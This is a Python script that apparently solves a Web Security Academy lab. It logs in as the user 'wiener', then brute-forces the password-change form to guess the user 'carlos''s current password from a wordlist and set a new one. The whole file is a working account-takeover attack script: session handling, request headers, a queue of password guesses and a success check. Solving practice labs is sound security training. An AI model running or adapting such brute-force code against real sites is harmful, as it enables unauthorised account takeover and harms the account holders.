import queue
import sys
import time
import requests
from queue import Queue

server_name = "0a6e00df03f7f2fb80e7268900740051"

url = f"https://{server_name}.web-security-academy.net"
login ="/login"
logout ="/logout"
change_password = "/my-account/change-password"
my_account = "/my-account?id=wiener"

headers = {
    "Host": f"{server_name}.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": url,
    "Referer": url,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive"
}

password_queue = queue.Queue()

def bruteForce():

    while not password_queue.empty():
        # Setting a new session.
        session = requests.session()

        # Getting the next password in the queue.
        password = password_queue.get()
        print(f"[-] Trying password: {password}")

        # Getting the session ID.
        response = session.get(url + login, headers=headers, allow_redirects=False)
        session_value = response.cookies.get("session")

        # Logging in as wiener.
        headers["Cookie"] = f"session={session_value}"
        login_data = 'username=wiener&password=123'
        response = session.post(url + login, headers=headers, data=login_data, allow_redirects=False)

        # Sending a password reset request.
        session_value = response.cookies.get("session")
        headers["Cookie"] = f"session={session_value}"
        headers["Referer"] = url + my_account
        reset_password_data = f"username=carlos&current-password={password}&new-password-1=123&new-password-2=123"
        response = session.post(url+change_password, headers=headers, data=reset_password_data)

        if b'Password changed successfully!' in response.content:
            print(f"\n[*] Password changed!")
            sys.exit(0)

def main1():
    # Put the passwords in a Queue
    with open('../../credentials/passwords', 'r') as file:
        for line in file:
            password_queue.put(line.strip('\n'))

    while not password_queue.empty():
        bruteForce()


if __name__ == '__main__':
    main1()
